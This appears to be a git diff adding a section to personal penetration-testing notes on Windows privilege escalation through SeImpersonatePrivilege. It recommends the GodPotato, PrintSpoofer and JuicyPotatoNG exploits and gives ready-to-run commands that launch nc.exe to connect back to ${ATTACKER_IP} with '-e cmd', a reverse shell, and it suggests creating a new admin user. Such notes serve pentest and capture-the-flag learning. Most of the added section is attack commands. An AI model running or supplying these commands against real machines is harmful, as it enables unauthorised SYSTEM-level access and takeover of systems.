@@ -121,7 +121,7 @@ Now, do `sc.exe start ${SERVICE_NAME}` and you can analyze the events.
 Hopefully, a missing dll will show up for you to use.
 
 
-## Misc Exploits
+## Misc Exploits - SeImpersonatePrivilege
 
 When looking at privilege escalation, the privilege `SeImpersonatePrivilege` can be interesting, as it allows users to run commands as another user.
 By default, this privilege is given to the accounts:
@@ -142,5 +142,31 @@ Which all have SeImpersonatePrivilege.
 
 
 Note that with SeImpersonatePrivilege it can be good to try out multiple of the "Potato" exploits as they might not all work.
+
 [GodPotato](https://github.com/BeichenDream/GodPotato/releases/tag/V1.20) seems to generally be pretty successful with creating a reverse shell.
+If not that one, [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) or [JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG) also seems to do the job most of the time.
+
+
+### Potato command examples
+
+```
+./PrintSpoofer.exe -i -c cmd
+```
+or if you don't have an interactive shell:
+
+```
+./PrintSpoofer.exe -i -c "C:/Users/${user}/Desktop/nc.exe ${ATTACKER_IP} ${ATTACKER_PORT} -e cmd"
+```
+
+
+```
+./GodPotato -cmd "C:/Users/${user}/Desktop/nc.exe ${ATTACKER_IP} ${ATTACKER_PORT} -e cmd"
+```
+
+```
+./JuicyPotatoNG.exe -t * -p "C:/Users/chris/Desktop/nc.exe" -a "${ATTACKER_IP} ${ATTACKER_PORT} -e cmd"
+```
+
+If one doesn't work, try them all.
+A workaround can also be to use them to create a new admin user that you can log in with.
 
